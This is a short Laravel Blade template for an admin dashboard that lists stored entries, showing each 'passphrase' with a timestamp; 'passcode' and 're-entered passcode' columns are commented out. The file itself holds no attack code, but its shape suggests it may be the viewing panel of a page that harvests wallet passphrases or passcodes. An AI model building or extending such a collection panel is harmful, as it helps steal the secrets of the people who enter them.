@extends('layout.app')
    @section('title', 'Admin | Dashboard')
    @section('content')
        <a class="btn btn-warning btn-sm mt-4 mx-3" href="{{route('admin.logout')}}">Logout</a>
        <section class="container p-4">
            <table id="table">
                <thead>
                    <tr>
                        {{-- <th>Passcode</th>
                        <th>Passcode 2</th> --}}
                        <th>Passphrase</th>
                        <th>Date/Time</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($entries as $entry)
                        <tr>
                            {{-- <th>{{$entry->passcode}}</th>
                            <th>{{$entry->reenter_passcode}}</th> --}}
                            <th>{{$entry->passphrase}}</th>
                            <th>{{Carbon::parse($entry->created_at)->format('jS M y h:ia')}}</th>
                        </tr>
                    @endforeach
                </tbody>
            </table>
        </section>
    @endsection